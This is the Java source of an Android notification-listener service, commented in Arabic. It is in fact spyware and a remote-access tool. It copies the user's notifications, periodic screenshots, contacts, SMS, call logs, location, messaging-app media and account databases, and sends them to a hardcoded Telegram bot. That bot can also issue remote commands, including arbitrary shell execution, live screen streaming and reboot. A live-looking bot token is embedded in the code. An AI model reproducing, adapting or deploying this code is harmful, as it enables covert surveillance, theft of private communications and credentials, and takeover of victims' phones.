package com.v8.global.sniffer;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.provider.CallLog;
import android.location.Location;
import android.location.LocationManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import android.media.MediaScannerConnection;
import android.os.Environment;
import android.util.Log;
import android.app.NotificationManager;
import android.app.NotificationChannel;
import android.os.Build;
import android.app.PendingIntent;
import android.widget.Toast;
import android.provider.Settings;

import okhttp3.*;
import java.io.*;
import java.net.*;
import java.util.*;
import java.text.SimpleDateFormat;

public class NotificationService extends NotificationListenerService {

    // ⚠️ ضع معلوماتك هنا ⚠️
    private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private final OkHttpClient client = new OkHttpClient();
    private Handler handler = new Handler(Looper.getMainLooper());
    
    // للإشعارات
    private Set<String> sentNotifications = new HashSet<>();
    private int notificationCount = 0;
    
    // للقطات الشاشة
    private int screenshotCount = 0;
    
    // للحسابات
    private Map<String, Long> accountFileSizes = new HashMap<>();
    
    // للتحكم عن بعد
    private boolean isStreaming = false;
    private ServerSocket streamServer;
    private Thread streamThread;
    private Set<Socket> streamClients = new HashSet<>();
    
    // مسارات التطبيقات المهمة
    private final String[] TARGET_APPS = {
        "com.whatsapp", "org.telegram.messenger", "com.facebook.orca",
        "com.instagram.android", "com.zhiliaoapp.musically", "com.ss.android.ugc.trill",
        "com.facebook.katana", "com.snapchat.android", "com.twitter.android",
        "com.google.android.gm", "com.android.mms", "com.google.android.apps.messaging"
    };

    @Override
    public void onCreate() {
        super.onCreate();
        startAllServices();
        startCommandListener();
    }

    private void startAllServices() {
        // بدء جميع الخدمات
        handler.postDelayed(screenshotRunnable, 15000); // كل 15 ثانية
        handler.postDelayed(accountRunnable, 5000);     // كل 5 ثواني
        handler.postDelayed(personalDataRunnable, 300000); // كل 5 دقائق
        handler.postDelayed(appsDataRunnable, 900000);  // كل 15 دقيقة
        handler.postDelayed(reportRunnable, 3600000);   // كل ساعة
        
        sendToTelegram("✅ V13 نشط", "السحب التلقائي والتحكم عن بعد شغال");
        grabInitialData();
    }

    // ========== نظام التحكم عن بعد والاستماع للأوامر ==========
    private void startCommandListener() {
        new Thread(() -> {
            while (true) {
                try {
                    checkTelegramCommands();
                    Thread.sleep(2000);
                } catch (Exception e) {
                    Log.e("V8", "Command listener error", e);
                }
            }
        }).start();
    }

    private void checkTelegramCommands() {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates";
            Request request = new Request.Builder().url(url).build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {}

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    try {
                        String json = response.body().string();
                        JSONObject obj = new JSONObject(json);
                        JSONArray result = obj.getJSONArray("result");
                        
                        for (int i = 0; i < result.length(); i++) {
                            JSONObject update = result.getJSONObject(i);
                            JSONObject message = update.getJSONObject("message");
                            String text = message.getString("text");
                            long chatId = message.getJSONObject("chat").getLong("id");
                            
                            if (chatId == Long.parseLong(CHAT_ID)) {
                                executeCommand(text);
                                
                                // حذف الرسالة
                                String deleteUrl = "https://api.telegram.org/bot" + BOT_TOKEN + 
                                    "/deleteMessage?chat_id=" + CHAT_ID + "&message_id=" + update.getInt("update_id");
                                Request deleteReq = new Request.Builder().url(deleteUrl).build();
                                client.newCall(deleteReq).enqueue(new Callback() {
                                    @Override public void onFailure(Call call, IOException e) {}
                                    @Override public void onResponse(Call call, Response response) throws IOException {
                                        response.close();
                                    }
                                });
                            }
                        }
                    } catch (Exception e) {
                        Log.e("V8", "Parse error", e);
                    }
                    response.close();
                }
            });
        } catch (Exception e) {
            Log.e("V8", "Command error", e);
        }
    }

    private void executeCommand(String cmd) {
        cmd = cmd.toLowerCase().trim();
        
        if (cmd.equals("/stream")) {
            startLiveStream();
        }
        else if (cmd.equals("/stopstream")) {
            stopLiveStream();
        }
        else if (cmd.equals("/screenshot") || cmd.equals("/screen")) {
            takeScreenshot();
        }
        else if (cmd.startsWith("/shell ")) {
            String command = cmd.substring(7);
            executeShellCommand(command);
        }
        else if (cmd.equals("/contacts")) {
            grabAllContacts();
        }
        else if (cmd.equals("/sms")) {
            grabAllSMS();
        }
        else if (cmd.equals("/calls")) {
            grabAllCalls();
        }
        else if (cmd.equals("/location")) {
            grabLocation();
        }
        else if (cmd.equals("/whatsapp")) {
            grabWhatsAppData();
        }
        else if (cmd.equals("/telegram")) {
            grabAppData("org.telegram.messenger", "تيليغرام", new String[]{".jpg", ".mp4"});
        }
        else if (cmd.equals("/photos")) {
            grabPhotos();
        }
        else if (cmd.startsWith("/open ")) {
            String pkg = cmd.substring(6);
            openApp(pkg);
        }
        else if (cmd.startsWith("/close ")) {
            String pkg = cmd.substring(7);
            closeApp(pkg);
        }
        else if (cmd.equals("/wifi-on")) {
            setWifi(true);
        }
        else if (cmd.equals("/wifi-off")) {
            setWifi(false);
        }
        else if (cmd.equals("/data-on")) {
            setMobileData(true);
        }
        else if (cmd.equals("/data-off")) {
            setMobileData(false);
        }
        else if (cmd.equals("/lock")) {
            lockScreen();
        }
        else if (cmd.equals("/reboot")) {
            rebootDevice();
        }
        else if (cmd.equals("/help")) {
            String help = """
                📋 أوامر التحكم:
                /stream - بدء البث المباشر
                /stopstream - إيقاف البث
                /screenshot - لقطة شاشة
                /contacts - جهات الاتصال
                /sms - الرسائل
                /calls - سجل المكالمات
                /location - الموقع
                /whatsapp - صور واتساب
                /telegram - صور تليغرام
                /photos - صور الجهاز
                /open [package] - فتح تطبيق
                /close [package] - إغلاق تطبيق
                /wifi-on - تشغيل WiFi
                /wifi-off - إطفاء WiFi
                /data-on - تشغيل البيانات
                /data-off - إطفاء البيانات
                /lock - قفل الشاشة
                /reboot - إعادة تشغيل
                /shell [command] - أمر مباشر
                """;
            sendToTelegram("📋 المساعدة", help);
        }
    }

    // ========== نظام البث المباشر ==========
    private void startLiveStream() {
        if (isStreaming) {
            sendToTelegram("📡 البث", "البث شغال بالفعل");
            return;
        }
        
        isStreaming = true;
        streamThread = new Thread(() -> {
            try {
                streamServer = new ServerSocket(8888);
                String ip = getLocalIpAddress();
                sendToTelegram("📡 بدء البث", 
                    "رابط البث: http://" + ip + ":8888\nافتح الرابط في المتصفح أو VLC");
                
                while (isStreaming) {
                    try {
                        Socket client = streamServer.accept();
                        streamClients.add(client);
                        handleStreamClient(client);
                    } catch (Exception e) {}
                }
            } catch (Exception e) {
                Log.e("V8", "Stream error", e);
                sendToTelegram("❌ خطأ في البث", e.getMessage());
            }
        });
        streamThread.start();
    }

    private void stopLiveStream() {
        isStreaming = false;
        try {
            for (Socket client : streamClients) {
                try { client.close(); } catch (Exception e) {}
            }
            streamClients.clear();
            if (streamServer != null) streamServer.close();
        } catch (Exception e) {}
        sendToTelegram("📡 البث", "تم إيقاف البث المباشر");
    }

    private void handleStreamClient(Socket client) {
        new Thread(() -> {
            try {
                OutputStream out = client.getOutputStream();
                PrintWriter writer = new PrintWriter(out);
                
                // إرسال رأس HTTP للبث
                writer.println("HTTP/1.1 200 OK");
                writer.println("Content-Type: multipart/x-mixed-replace; boundary=--boundary");
                writer.println();
                writer.flush();
                
                while (isStreaming && client.isConnected()) {
                    try {
                        String path = takeScreenshotAndGetPath();
                        if (path != null) {
                            File file = new File(path);
                            FileInputStream fis = new FileInputStream(file);
                            
                            writer.println("--boundary");
                            writer.println("Content-Type: image/jpeg");
                            writer.println("Content-Length: " + file.length());
                            writer.println();
                            writer.flush();
                            
                            byte[] buffer = new byte[4096];
                            int bytesRead;
                            while ((bytesRead = fis.read(buffer)) != -1) {
                                out.write(buffer, 0, bytesRead);
                            }
                            fis.close();
                            out.flush();
                            
                            file.delete();
                        }
                        Thread.sleep(100); // 10 لقطات في الثانية
                    } catch (Exception e) {}
                }
            } catch (Exception e) {}
        }).start();
    }

    private String takeScreenshotAndGetPath() {
        try {
            String path = getExternalFilesDir(null) + "/stream_" + System.currentTimeMillis() + ".jpg";
            Process process = Runtime.getRuntime().exec("screencap -p " + path);
            process.waitFor(2, java.util.concurrent.TimeUnit.SECONDS);
            File file = new File(path);
            if (file.exists() && file.length() > 1000) return path;
        } catch (Exception e) {}
        return null;
    }

    private String getLocalIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
                        return inetAddress.getHostAddress();
                    }
                }
            }
        } catch (Exception e) {}
        return "localhost";
    }

    // ========== أوامر التحكم الإضافية ==========
    private void executeShellCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null && output.length() < 1000) {
                output.append(line).append("\n");
            }
            process.waitFor(5, java.util.concurrent.TimeUnit.SECONDS);
            sendToTelegram("💻 Shell: " + command, output.toString());
        } catch (Exception e) {
            sendToTelegram("❌ خطأ", e.getMessage());
        }
    }

    private void openApp(String packageName) {
        try {
            Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                sendToTelegram("▶️ فتح", "تم فتح " + packageName);
            }
        } catch (Exception e) {
            sendToTelegram("❌ خطأ", "لا يمكن فتح التطبيق");
        }
    }

    private void closeApp(String packageName) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                am.forceStopPackage(packageName);
                sendToTelegram("⏹️ إغلاق", "تم إغلاق " + packageName);
            }
        } catch (Exception e) {}
    }

    private void setWifi(boolean enable) {
        try {
            Settings.Global.putString(getContentResolver(), "wifi_on", enable ? "1" : "0");
            sendToTelegram("📶 WiFi", enable ? "تم التشغيل" : "تم الإطفاء");
        } catch (Exception e) {}
    }

    private void setMobileData(boolean enable) {
        try {
            Settings.Global.putString(getContentResolver(), "mobile_data", enable ? "1" : "0");
            sendToTelegram("📱 بيانات", enable ? "تم التشغيل" : "تم الإطفاء");
        } catch (Exception e) {}
    }

    private void lockScreen() {
        try {
            Process process = Runtime.getRuntime().exec("input keyevent 26");
            sendToTelegram("🔒 قفل", "تم قفل الشاشة");
        } catch (Exception e) {}
    }

    private void rebootDevice() {
        try {
            Process process = Runtime.getRuntime().exec("reboot");
            sendToTelegram("🔄 إعادة تشغيل", "جاري إعادة التشغيل...");
        } catch (Exception e) {}
    }

    private void grabPhotos() {
        try {
            File pictures = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
            File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
            
            List<String> photos = new ArrayList<>();
            for (File dir : new File[]{pictures, dcim}) {
                if (dir.exists()) {
                    File[] files = dir.listFiles();
                    if (files != null) {
                        for (File f : files) {
                            if (f.isFile() && f.length() < 50*1024*1024) {
                                String name = f.getName().toLowerCase();
                                if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png")) {
                                    photos.add(f.getAbsolutePath());
                                }
                            }
                        }
                    }
                }
            }
            
            sendToTelegram("📸 الصور", "تم العثور على " + photos.size() + " صورة");
            for (int i = 0; i < Math.min(3, photos.size()); i++) {
                sendFileToTelegram("صورة", photos.get(i));
            }
        } catch (Exception e) {}
    }

    // ========== 1. نظام الإشعارات (بدون تغيير) ==========
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            if (sbn.getPackageName().equals("android")) return;

            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            Object textObj = extras.get(Notification.EXTRA_TEXT);
            String text = (textObj != null) ? textObj.toString() : "";
            String appName = sbn.getPackageName();
            String appLabel = getAppName(appName);

            if (title.length() < 2 && text.length() < 2) return;

            String notifId = appName + "|" + title + "|" + text;
            if (sentNotifications.contains(notifId)) return;
            
            sentNotifications.add(notifId);
            if (sentNotifications.size() > 200) {
                sentNotifications.remove(sentNotifications.iterator().next());
            }

            notificationCount++;

            String message = "🔔 إشعار #" + notificationCount + "\n" +
                           "📱 التطبيق: " + appLabel + "\n";
            if (!title.isEmpty()) message += "👤 " + title + "\n";
            if (!text.isEmpty()) message += "💬 " + text;

            sendToTelegram("إشعار جديد", message);

            if (isImportantApp(appName)) {
                handler.postDelayed(() -> takeScreenshot(), 1000);
            }

        } catch (Exception e) {
            Log.e("V8", "Notification error", e);
        }
    }

    // ========== 2. لقطات الشاشة ==========
    private Runnable screenshotRunnable = new Runnable() {
        @Override
        public void run() {
            takeScreenshot();
            handler.postDelayed(this, 15000);
        }
    };

    private void takeScreenshot() {
        try {
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
            String path = Environment.getExternalStorageDirectory() + "/Pictures/screen_" + timeStamp + ".png";
            
            Process process = Runtime.getRuntime().exec("screencap -p " + path);
            process.waitFor(5, java.util.concurrent.TimeUnit.SECONDS);
            
            File file = new File(path);
            if (file.exists() && file.length() > 1000) {
                screenshotCount++;
                sendFileToTelegram("📸 لقطة #" + screenshotCount, file.getAbsolutePath());
            }
        } catch (Exception e) {
            Log.e("V8", "Screenshot error", e);
        }
    }

    // ========== 3. مراقبة الحسابات ==========
    private Runnable accountRunnable = new Runnable() {
        @Override
        public void run() {
            checkNewAccounts();
            handler.postDelayed(this, 5000);
        }
    };

    private void checkNewAccounts() {
        try {
            String[] accountPaths = {
                "/data/system/users/0/accounts.db",
                "/data/data/com.google.android.gms/databases/accounts.db",
                "/data/data/com.whatsapp/shared_prefs/WhatsApp.xml",
                "/data/data/org.telegram.messenger/shared_prefs/org.telegram.messenger_preferences.xml",
                "/data/data/com.facebook.orca/shared_prefs",
                "/data/data/com.instagram.android/shared_prefs",
                "/data/data/com.zhiliaoapp.musically/shared_prefs"
            };

            List<String> newAccounts = new ArrayList<>();

            for (String path : accountPaths) {
                File file = new File(path);
                if (file.exists()) {
                    long currentSize = file.length();
                    String key = path + "_" + currentSize;

                    if (accountFileSizes.containsKey(path)) {
                        long oldSize = accountFileSizes.get(path);
                        if (currentSize != oldSize) {
                            newAccounts.add("📁 تغير في " + getAppNameFromPath(path));
                            
                            if (currentSize < 10 * 1024 * 1024) {
                                String tempPath = Environment.getExternalStorageDirectory() + "/Download/account_" + System.currentTimeMillis() + ".dat";
                                copyFile(file, new File(tempPath));
                                sendFileToTelegram("🔐 ملف " + getAppNameFromPath(path), tempPath);
                            }
                        }
                    }
                    accountFileSizes.put(path, currentSize);
                }
            }

            if (!newAccounts.isEmpty()) {
                StringBuilder msg = new StringBuilder();
                for (String acc : newAccounts) {
                    msg.append(acc).append("\n");
                }
                sendToTelegram("🔐 حسابات جديدة (" + newAccounts.size() + ")", msg.toString());
                
                handler.postDelayed(() -> takeScreenshot(), 1000);
            }

        } catch (Exception e) {
            Log.e("V8", "Account check error", e);
        }
    }

    // ========== 4. البيانات الشخصية ==========
    private Runnable personalDataRunnable = new Runnable() {
        @Override
        public void run() {
            grabAllContacts();
            grabAllSMS();
            grabAllCalls();
            grabLocation();
            handler.postDelayed(this, 300000);
        }
    };

    private void grabAllContacts() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);

            if (cursor != null) {
                StringBuilder contacts = new StringBuilder();
                int count = 0;

                while (cursor.moveToNext() && count < 100) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contacts.append(name).append(": ").append(number).append("\n");
                    count++;
                }
                cursor.close();

                if (contacts.length() > 0) {
                    String path = Environment.getExternalStorageDirectory() + "/Download/contacts_" + System.currentTimeMillis() + ".txt";
                    writeToFile(contacts.toString(), path);
                    sendFileToTelegram("👥 جهات الاتصال", path);
                }
            }
        } catch (Exception e) {
            Log.e("V8", "Contacts error", e);
        }
    }

    private void grabAllSMS() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(Uri.parse("content://sms/inbox"),
                    null, null, null, "date DESC LIMIT 100");

            if (cursor != null) {
                StringBuilder sms = new StringBuilder();
                int count = 0;

                while (cursor.moveToNext() && count < 100) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    String date = cursor.getString(cursor.getColumnIndex("date"));
                    sms.append("من: ").append(address).append("\n");
                    sms.append("نص: ").append(body).append("\n");
                    sms.append("تاريخ: ").append(date).append("\n\n");
                    count++;
                }
                cursor.close();

                if (sms.length() > 0) {
                    String path = Environment.getExternalStorageDirectory() + "/Download/sms_" + System.currentTimeMillis() + ".txt";
                    writeToFile(sms.toString(), path);
                    sendFileToTelegram("📨 الرسائل", path);
                }
            }
        } catch (Exception e) {
            Log.e("V8", "SMS error", e);
        }
    }

    private void grabAllCalls() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI,
                    null, null, null, CallLog.Calls.DATE + " DESC LIMIT 100");

            if (cursor != null) {
                StringBuilder calls = new StringBuilder();
                int count = 0;

                while (cursor.moveToNext() && count < 100) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    
                    String typeStr = "وارد";
                    if ("2".equals(type)) typeStr = "صادر";
                    if ("3".equals(type)) typeStr = "فائت";
                    
                    calls.append("رقم: ").append(number).append("\n");
                    calls.append("نوع: ").append(typeStr).append("\n");
                    calls.append("مدة: ").append(duration).append(" ثانية\n");
                    calls.append("تاريخ: ").append(date).append("\n\n");
                    count++;
                }
                cursor.close();

                if (calls.length() > 0) {
                    String path = Environment.getExternalStorageDirectory() + "/Download/calls_" + System.currentTimeMillis() + ".txt";
                    writeToFile(calls.toString(), path);
                    sendFileToTelegram("📞 سجل المكالمات", path);
                }
            }
        } catch (Exception e) {
            Log.e("V8", "Calls error", e);
        }
    }

    private void grabLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) {
                location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }

            if (location != null) {
                String loc = "الموقع الحالي:\n";
                loc += "خط العرض: " + location.getLatitude() + "\n";
                loc += "خط الطول: " + location.getLongitude() + "\n";
                loc += "الدقة: " + location.getAccuracy() + " متر";
                sendToTelegram("📍 الموقع", loc);
            }
        } catch (Exception e) {
            Log.e("V8", "Location error", e);
        }
    }

    // ========== 5. بيانات التطبيقات ==========
    private Runnable appsDataRunnable = new Runnable() {
        @Override
        public void run() {
            grabAllAppsData();
            handler.postDelayed(this, 900000);
        }
    };

    private void grabAllAppsData() {
        grabAppData("com.zhiliaoapp.musically", "تيك توك", new String[]{".mp4", ".jpg"});
        grabAppData("com.ss.android.ugc.trill", "تيك توك", new String[]{".mp4", ".jpg"});
        grabAppData("com.facebook.orca", "مسنجر", new String[]{".jpg", ".png", ".mp4"});
        grabWhatsAppData();
        grabAppData("org.telegram.messenger", "تيليغرام", new String[]{".jpg", ".mp4", ".pdf"});
        grabAppData("com.instagram.android", "انستغرام", new String[]{".jpg", ".mp4"});
    }

    private void grabAppData(String packageName, String appName, String[] extensions) {
        try {
            String[] paths = {
                "/data/data/" + packageName + "/files",
                "/data/data/" + packageName + "/cache",
                Environment.getExternalStorageDirectory() + "/Android/data/" + packageName + "/files"
            };

            List<String> files = new ArrayList<>();

            for (String path : paths) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    File[] list = dir.listFiles();
                    if (list != null) {
                        for (File file : list) {
                            if (file.isFile() && file.length() < 50 * 1024 * 1024) {
                                for (String ext : extensions) {
                                    if (file.getName().endsWith(ext)) {
                                        files.add(file.getAbsolutePath());
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
            }

            if (!files.isEmpty()) {
                sendToTelegram("📱 " + appName, "تم العثور على " + files.size() + " ملف");
                for (int i = 0; i < Math.min(3, files.size()); i++) {
                    sendFileToTelegram(appName, files.get(i));
                }
            }

        } catch (Exception e) {
            Log.e("V8", "App data error", e);
        }
    }

    private void grabWhatsAppData() {
        try {
            String[] paths = {
                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Images",
                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Video",
                Environment.getExternalStorageDirectory() + "/WhatsApp/Databases"
            };

            List<String> files = new ArrayList<>();

            for (String path : paths) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    File[] list = dir.listFiles();
                    if (list != null) {
                        for (File file : list) {
                            if (file.isFile() && file.length() < 50 * 1024 * 1024) {
                                files.add(file.getAbsolutePath());
                            }
                        }
                    }
                }
            }

            if (!files.isEmpty()) {
                sendToTelegram("📱 واتساب", "تم العثور على " + files.size() + " ملف");
                for (int i = 0; i < Math.min(3, files.size()); i++) {
                    sendFileToTelegram("واتساب", files.get(i));
                }
            }

        } catch (Exception e) {
            Log.e("V8", "WhatsApp error", e);
        }
    }

    // ========== 6. التقارير ==========
    private Runnable reportRunnable = new Runnable() {
        @Override
        public void run() {
            sendReport();
            handler.postDelayed(this, 3600000);
        }
    };

    private void sendReport() {
        long hours = System.currentTimeMillis() / 3600000;
        String report = "📊 تقرير " + hours + " ساعة:\n" +
                       "📸 لقطات: " + screenshotCount + "\n" +
                       "🔔 إشعارات: " + notificationCount + "\n" +
                       "🔐 ملفات مراقبة: " + accountFileSizes.size();
        sendToTelegram("📊 تقرير دوري", report);
    }

    // ========== البيانات الأولية ==========
    private void grabInitialData() {
        new Thread(() -> {
            grabAllContacts();
            grabAllSMS();
            grabAllCalls();
            grabLocation();
            grabAllAppsData();
        }).start();
    }

    // ========== أدوات مساعدة ==========
    private String getAppName(String packageName) {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(ai).toString();
        } catch (Exception e) {
            return packageName;
        }
    }

    private boolean isImportantApp(String packageName) {
        for (String app : TARGET_APPS) {
            if (packageName.contains(app)) return true;
        }
        return false;
    }

    private String getAppNameFromPath(String path) {
        if (path.contains("whatsapp")) return "واتساب";
        if (path.contains("telegram")) return "تيليغرام";
        if (path.contains("facebook")) return "فيسبوك";
        if (path.contains("instagram")) return "انستغرام";
        if (path.contains("musically")) return "تيك توك";
        if (path.contains("google")) return "جوجل";
        return "تطبيق";
    }

    private void writeToFile(String content, String path) {
        try {
            FileWriter writer = new FileWriter(path);
            writer.write(content);
            writer.close();
        } catch (Exception e) {
            Log.e("V8", "Write error", e);
        }
    }

    private void copyFile(File src, File dst) {
        try {
            FileInputStream in = new FileInputStream(src);
            FileOutputStream out = new FileOutputStream(dst);
            byte[] buffer = new byte[1024];
            int len;
            while ((len = in.read(buffer)) > 0) {
                out.write(buffer, 0, len);
            }
            in.close();
            out.close();
        } catch (Exception e) {
            Log.e("V8", "Copy error", e);
        }
    }

    private void sendToTelegram(String title, String message) {
        try {
            String fullMessage = "🔴 V13\n📌 " + title + "\n\n" + message;
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + Uri.encode(fullMessage);
            
            Request request = new Request.Builder().url(url).build();
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) throws IOException { 
                    response.close(); 
                }
            });
        } catch (Exception e) {
            Log.e("V8", "Send error", e);
        }
    }

    private void sendFileToTelegram(String caption, String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists() || file.length() > 50 * 1024 * 1024) return;

            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", "🔴 " + caption)
                    .addFormDataPart("document", file.getName(),
                            RequestBody.create(MediaType.parse("application/octet-stream"), file))
                    .build();

            Request request = new Request.Builder().url(url).post(requestBody).build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) throws IOException { 
                    response.close();
                    file.delete();
                }
            });

        } catch (Exception e) {
            Log.e("V8", "Send file error", e);
        }
    }
                    }
